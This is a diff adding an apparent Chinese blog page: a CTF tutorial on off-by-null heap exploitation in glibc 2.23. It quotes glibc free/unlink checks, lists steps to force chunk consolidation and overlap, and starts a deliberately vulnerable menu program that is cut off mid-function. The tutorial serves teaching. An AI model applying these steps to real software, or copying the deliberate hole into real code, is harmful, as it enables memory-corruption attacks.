@@ -1,0 +1,1642 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>off by null利用总结 - Luexp</title><meta name="Description" content="Luexp&#39;s blog"><meta property="og:title" content="off by null利用总结" />
+<meta property="og:description" content="夏天的风，我永远记得，清清楚楚的说你爱我。		——《夏天的风》" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-07-13T21:32:56+00:00" />
+<meta property="article:modified_time" content="2020-07-13T21:32:56+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="off by null利用总结"/>
+<meta name="twitter:description" content="夏天的风，我永远记得，清清楚楚的说你爱我。		——《夏天的风》"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" /><link rel="prev" href="http://example.org/introduction-to-the-python-sandbox-and-bytecode/" /><link rel="next" href="http://example.org/sctf-wp/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "off by null利用总结",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93\/"
+        },"genre": "posts","keywords": "pwn","wordcount":  8920 ,
+        "url": "http:\/\/example.org\/off-by-one%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93\/","datePublished": "2020-07-13T21:32:56+00:00","dateModified": "2020-07-13T21:32:56+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Luexp"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Luexp"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/logo.png"
+        data-srcset="/logo.png, /logo.png 1.5x, /logo.png 2x"
+        data-sizes="auto"
+        alt="/logo.png"
+        title="/logo.png" />Luexp&#39;s Life</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="GO!"> 文章 </a><a class="menu-item" href="/tags/" title="BIU!"> 标签 </a><a class="menu-item" href="/categories/" title="BOOM!"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Luexp"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/logo.png"
+        data-srcset="/logo.png, /logo.png 1.5x, /logo.png 2x"
+        data-sizes="auto"
+        alt="/logo.png"
+        title="/logo.png" />Luexp&#39;s Life</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="GO!">文章</a><a class="menu-item" href="/tags/" title="BIU!">标签</a><a class="menu-item" href="/categories/" title="BOOM!">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">off by null利用总结</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Luexp</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>ctf</a>&nbsp;<a href="/categories/knowledge/"><i class="far fa-folder fa-fw"></i>knowledge</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-07-13">2020-07-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 8920 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 18 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#例题">例题</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#例题-1">例题</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#例题-2">例题</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>夏天的风，我永远记得，清清楚楚的说你爱我。		——《夏天的风》</p>
+<h1 id="前言">前言</h1>
+<p>off by null是堆块中十分容易出现的一种漏洞，在ctf中十分的常见。off by null漏洞就是堆块可以向下一个堆块溢出一个字节的数据，而该数据为\x00，这与溢出任意一个字节的数据是由区别的。如果是溢出任意一个字节，那么就可以修改下一个堆块的大小，而off by null则不能，它仅仅只可以将下一个堆块的inuse位置零，进而在free时发生堆块合并，进而overlapping来实现进一步的攻击。在堆块合并时，会进行unlink来取出要合并的chunk，所以想要利用off by null，我们还需要绕过unlink的保护。libc2.29中新增了对堆块合并的检测所以其利用机制和libc-2.27和libc-2.23有所区别，2.27与2.23基本没有太大的区别，只需要将tcache填满即可，不过里面依然有几点需要我们注意的，这将会在后面讲诉。</p>
+<p>所以让我们先从2.23版本的libc讲起，再进入2.27，最后讲解最复杂的2.29。</p>
+<h1 id="libc223的利用">libc2.23的利用</h1>
+<p>首先我们来介绍一下2.23版本下off by null的利用方法，然后用一道例题实战巩固一下。</p>
+<p>我们先分配四个堆块A，B，C，D，其大小分别是0x90，0x20，0x100，0x20。在堆中的排列如下。（ps：我们知道堆块size的最低3位有特殊意义，最低位代表pre_inuse，其值为1时代表上一个堆块正在使用，为0时代表上一个堆块未使用被free掉，而off by null正是利用这一点，将最低位的pre_inuse溢出为0进而发生堆块合并。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/07/3yENTexV5nQPBlb.png"
+        data-srcset="https://i.loli.net/2020/07/07/3yENTexV5nQPBlb.png, https://i.loli.net/2020/07/07/3yENTexV5nQPBlb.png 1.5x, https://i.loli.net/2020/07/07/3yENTexV5nQPBlb.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/07/3yENTexV5nQPBlb.png"
+        title="image-20200706225142650" /></p>
+<p>A堆块的作用是构造满足unlink条件的堆块。当其释放时，将会放入unsortedbin堆块中，而unsorted bin堆块会给A堆块的fd，bk字段赋值为unsorted bin表头地址，进而可以通过验证。</p>
+<p>B堆块的作用是利用off by null漏洞，修改下一个堆块的pre_inuse位为零。这里B堆块的大小可以根据需要来改变，当我们发生堆块合并后，B堆块将会被释放，进而就有了一个UAF漏洞可以利用。</p>
+<p>C堆块的作用是发生堆块合并，使ABC三个堆块共同合并成一个堆块释放到bin中。当C堆块的pre_inuse位修改位零时，释放C堆块就会发生向前合并。注意因为off by null会修改C堆块size位的最低字节位零，所以C块的大小要向0x100对齐，如果是0x120的话，那么就会修改其大小为0x100，这样在堆块释放时将会发生错误。</p>
+<p>D堆块的作用时防止合并后的堆块与Top chunk合并。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.loli.net/2020/07/07/lO7InqR5mZ8hPeM.png"
+        data-srcset="https://i.loli.net/2020/07/07/lO7InqR5mZ8hPeM.png, https://i.loli.net/2020/07/07/lO7InqR5mZ8hPeM.png 1.5x, https://i.loli.net/2020/07/07/lO7InqR5mZ8hPeM.png 2x"
+        data-sizes="auto"
+        alt="https://i.loli.net/2020/07/07/lO7InqR5mZ8hPeM.png"
+        title="image-20200707211635055" /></p>
+<p>我们现在来看看当我们释放C堆块时究竟发生了什么（如果对于libc的堆块管理不是很清楚的朋友，可以看一看我之前写过的<a href="https://www.nopnoping.xyz/2020/05/19/%e4%b8%8d%e5%90%8c%e7%89%88%e6%9c%acglibc%e7%9a%84%e5%a0%86%e7%ae%a1%e7%90%86%e5%92%8c%e6%96%b0%e5%a2%9e%e4%bf%9d%e6%8a%a4%e6%9c%ba%e5%88%b6/" target="_blank" rel="noopener noreffer">不同版本glibc的堆管理和新增保护机制</a>)，这里我们只选择相关的关键部分讨论。）</p>
+<p>当我们释放C堆块时，所以会检测其大小是否在fastbin堆块的范围内，如果不在且不是map分配的就会进行下面的安全检测。（以下代码来至libc2.23</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* Lightweight tests: check whether the block is already the
+</span><span class="cm">       top block.  */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">))</span>
+      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;double free or corruption (top)&#34;</span><span class="p">);</span>
+    <span class="cm">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">contiguous</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span>
+			  <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">nextchunk</span>
+			  <span class="o">&gt;=</span> <span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span> <span class="o">+</span> <span class="n">chunksize</span><span class="p">(</span><span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">)),</span> <span class="mi">0</span><span class="p">))</span>
+	<span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;double free or corruption (out)&#34;</span><span class="p">);</span>
+    <span class="cm">/* Or whether the block is actually not marked used.  */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="o">!</span><span class="n">prev_inuse</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">)))</span>
+      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;double free or corruption (!prev)&#34;</span><span class="p">);</span>
+
+    <span class="n">nextsize</span> <span class="o">=</span> <span class="n">chunksize</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">nextchunk</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">SIZE_SZ</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+	<span class="o">||</span> <span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">nextsize</span> <span class="o">&gt;=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">system_mem</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+      <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;free(): invalid next size (normal)&#34;</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>第一个if检测当前要释放的堆块是否等于TOPchunk。</p>
+<p>第二个if检测下一个chunk是否在堆块地址范围内。</p>
+<p>第三个if检测下一个chunk的pre_inuse位是否为1。</p>
+<p>第四个if检测下一个chunk的大小是否满足要求。</p>
+<p>Obviously，我们构造的堆块C满足上面的四个条件。（如果C的地址不是0x100对齐的话，那么2，3，4检测都可能出错）。</p>
+<p>ok，通过上面的检测后，下面就来到我们讨论的重点了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* consolidate backward */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">prev_inuse</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="p">{</span>
+      <span class="n">prevsize</span> <span class="o">=</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
+      <span class="n">size</span> <span class="o">+=</span> <span class="n">prevsize</span><span class="p">;</span>
+      <span class="n">p</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">-</span><span class="p">((</span><span class="kt">long</span><span class="p">)</span> <span class="n">prevsize</span><span class="p">));</span>
+      <span class="n">unlink</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>首先检测堆块的prev_inuse位，如果prev_inuse位为零的话就会向后合并。那么究竟要向后合并多少字节的堆块呢？这个由prevsize位给出。根据prevsize位的大小，计算出待合并的chunk，将该chunk从双向链表中unlink出来，然后与该堆块合并构成一个新的堆块。</p>
+<p>所以如果我们修改prev_inuse位，并且修改后计算出来的待合并chunk满足unlink的条件的话，我们就可以实现堆块的overlapping。</p>
+<p>根据这个思路，我们修改C堆块的prev_inuse位为0xB0，那么在堆块合并时，根据prev_inuse位我们计算出待合并的堆块地是A，合并后的size大小是0x150，这样只要A堆块满足unlink的条件，我们就完成了ABC堆块的合并，进而可以利用UAF漏洞。这里我们再大致看一看unlink的内容。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define unlink(AV, P, BK, FD) {                                            \
+</span><span class="cp">    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
+</span><span class="cp">      malloc_printerr (&#34;corrupted size vs. prev_size&#34;);			      \
+</span><span class="cp">    FD = P-&gt;fd;								      \
+</span><span class="cp">    BK = P-&gt;bk;								      \
+</span><span class="cp">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \
+</span><span class="cp">      malloc_printerr (&#34;corrupted double-linked list&#34;);			      \
+</span><span class="cp">    else {								      \
+</span><span class="cp">        FD-&gt;bk = BK;							      \
+</span><span class="cp">        BK-&gt;fd = FD;							      \
+</span><span class="cp">        if (!in_smallbin_range (chunksize_nomask (P))			      \
+</span><span class="cp">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {		      \
+</span><span class="cp">	    if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \
+</span><span class="cp">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \
+</span><span class="cp">	      malloc_printerr (&#34;corrupted double-linked list (not small)&#34;);   \
+</span><span class="cp">            if (FD-&gt;fd_nextsize == NULL) {				      \
+</span><span class="cp">                if (P-&gt;fd_nextsize == P)				      \
+</span><span class="cp">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \
+</span><span class="cp">                else {							      \
+</span><span class="cp">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \
+</span><span class="cp">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \
+</span><span class="cp">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \
+</span><span class="cp">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \
+</span><span class="cp">                  }							      \
+</span><span class="cp">              } else {							      \
+</span><span class="cp">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \
+</span><span class="cp">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \
+</span><span class="cp">              }								      \
+</span><span class="cp">          }								      \
+</span><span class="cp">      }									      \
+</span><span class="cp">}
+</span></code></pre></td></tr></table>
+</div>
+</div><p>unlink首先会检擦该chunk的prev_size与size位是否匹配，然后就是我们熟悉的双向链表检验过程。显然，A堆块是我们正常释放的堆块，且其在unsorted bin堆块中，所以这些检查都能通过。</p>
+<p>ok，关于libc-2.23的利用原理介绍到这里就告一段落了，这里概括一下攻击步骤。</p>
+<ul>
+<li>分配ABCD，四个堆块。</li>
+<li>释放A堆块放入unsortedbin中。</li>
+<li>利用B堆块修改C堆块的prev_size大小和prev_inuse位。</li>
+<li>释放C堆块。</li>
+</ul>
+<p>下面我们就用一道例题来帮助大家理解，活学活用。</p>
+<h2 id="例题">例题</h2>
+<p>这里我就不在网上去找例题了，我们现写一道简单的有off by null漏洞的菜单题来运用刚才学到的知识。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp"></span><span class="k">struct</span> <span class="n">chunk</span><span class="p">{</span>
+	<span class="kt">long</span> <span class="o">*</span><span class="n">point</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
+<span class="p">}</span><span class="n">chunks</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+<span class="kt">void</span> <span class="nf">add</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Index?&#34;</span><span class="p">);</span>
+	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">index</span><span class="o">&gt;=</span><span class="mi">10</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;wrong index!&#34;</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Size?&#34;</span><span class="p">);</span>
+	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
+	<span class="n">chunks</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">point</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">chunks</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">point</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;malloc error!&#34;</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="n">chunks</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">size</span><span class="o">=</span><span class="n">size</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">show</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Index?&#34;</span><span class="p">);</span>
+	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">index</span><span class="o">&gt;=</span><span class="mi">10</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;wrong index!&#34;</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">chunks</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">point</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;It&#39;s blank!&#34;</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="n">puts</span><span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">index</span><span class="p">].</span><span class="n">point</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kt">void</span> <span class="nf">edit</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Index?&#34;</span><span class="p">);</span>
+	<span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">index</span><span class="o">&gt;=</span><span class="mi">10</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;wrong index!&#34;</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
